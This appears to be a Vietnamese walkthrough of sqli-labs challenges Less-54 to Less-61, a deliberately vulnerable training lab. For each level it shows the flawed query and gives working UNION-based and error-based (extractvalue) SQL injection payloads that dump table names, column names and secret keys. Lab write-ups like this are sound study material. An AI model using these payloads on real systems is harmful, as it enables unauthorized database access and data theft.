# sql-labs (Challenges)

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-54](#Less-54)
- [Less-55](#Less-55)
- [Less-56](#Less-56)
- [Less-57](#Less-57)
- [Less-58](#Less-58)
- [Less-59](#Less-59)
- [Less-60](#Less-60)
- [Less-61](#Less-61)



## Less-54

Source code tại [đây](https://github.com/Audi-1/sqli-labs/blob/master/Less-54/index.php).

Như trong mô tả của challenge:

 `The objective of this challenge is to dump the **(secret key)** from only random table from Database ***('CHALLENGES')\*** in Less than 10 attempts
For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.`

Mục tiêu của chall này là tìm ra `secret key` từ table trong database `challenges` trong 10 lần thử, và các tables đều được random sau mỗi lần reset.

Đây là câu query của chall:

```mysql
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
```

Trước tiên, chúng ta đã biết tên database là `challenges`, nên việc đầu tiên là leak ra tất cả các table trong `challenges`.

Payload: `?id=0%27+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-54_1.png?raw=true)

Sau khi có được tên table, mình tiếp tục leak các cột có trong table `6N9Y9FYKST`.

Payload: `?id=0%27+union+select+1,2,group_concat(+column_name+)+from+information_schema.columns+where+table_name="6N9Y9FYKST"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-54_2.png?raw=true)

Ở đây gồm 4 cột gồm: `id,sessid,secret_EHKV,tryy`. 

Secret key chắc nằm trong cột `secret_EHKV`, mình leak ra thôi.

Payload: `?id=0%27+union+select+1,2,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(challenges.6N9Y9FYKST)WHERE(@x)IN(@x:=CONCAT(0x20,@x,secret_EHKV,0x3c62723e))))x)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-54_3.png?raw=true)

Ban đầu mình sử dụng payload này: `0%27+union+select+1,2,group_concat(secret_EHKV) from challenges.6N9Y9FYKST--+`, nhưng không hiểu sao nó không in ra kết quả.

## Less-55

```mysql
SELECT * FROM security.users WHERE id=($id) LIMIT 0,1
```

Tương tự câu 54.

Lleak tên table:

`?id=0)+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-55_1.png?raw=true)

Leak tên column:

`?id=0)+union+select+1,2,group_concat(+column_name+)+from+information_schema.columns+where+table_name="PRY8J6L2PA"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-55_2.png?raw=true)

Cuối cùng là tìm secret key

`?id=0)+union+select+1,2,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(challenges.PRY8J6L2PA)WHERE(@x)IN(@x:=CONCAT(0x20,@x,secret_G2DM,0x3c62723e))))x)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-55_3.png?raw=true)

## Less-56

```mysql
SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1
```

Tương tự câu 54,55.

`?id=0%27)+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

## Less-57

```mysql
$id= '"'.$id.'"';
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

Tương tự các câu trên.

`?id=0"+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

## Less-58

```mysql
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
```

Trong câu này, chúng ta không như thể sử dụng payload các câu trước để bypass được, nhưng hàm `mysql_error()` sẽ được in ra khi câu query lỗi, lần này mình sử dụng `extractvalue()`.

Payload: `?id=0%27 and extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_1.png?raw=true)

Payload leak các table: `?id=0%27%20and%20extractvalue(0x0a,concat(0x0a,(SELECT+group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges")))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_2.png?raw=true)

Payload leak các cột: `?id=0%27%20and%20extractvalue(0x0a,concat(0x0a,(SELECT+group_concat(+column_name+)+from+information_schema.columns+where+table_name="1JUAF684JW")))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_3.png?raw=true)

Payload dump secret key, lần này thì được :joy: còn câu 54 xài không được. :magic:

`?id=0%27%20and%20extractvalue(0x0a,concat(0x0a,(SELECT+group_concat(secret_3MGY)%20from%20challenges.1JUAF684JW)))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_4.png?raw=true)

## Less-59

```mysql
SELECT * FROM security.users WHERE id=$id LIMIT 0,1
```

Câu này cũng dựa vào lỗi trả về `mysql_error()`, sử dụng `extractvalue()` như câu 58.

Payload: `?id=0%20and%20extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-59.png?raw=true)

## Less-60

```mysql
$id = '("'.$id.'")';
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

Câu này cũng tương tự 2 câu trên, tận dụng hàm `mysql_error()` được in ra, sử dụng `extractvalue()`.

Sử dụng `")` để escape và inject câu query.

Payload: `?id=0")%20and%20extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-60.png?raw=true)

## Less-61

```mysql
SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1
```

Tương tự câu trên. Sử dụng `'))` để escape và inject câu query.

`0%27))%20and%20extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-61.png?raw=true)

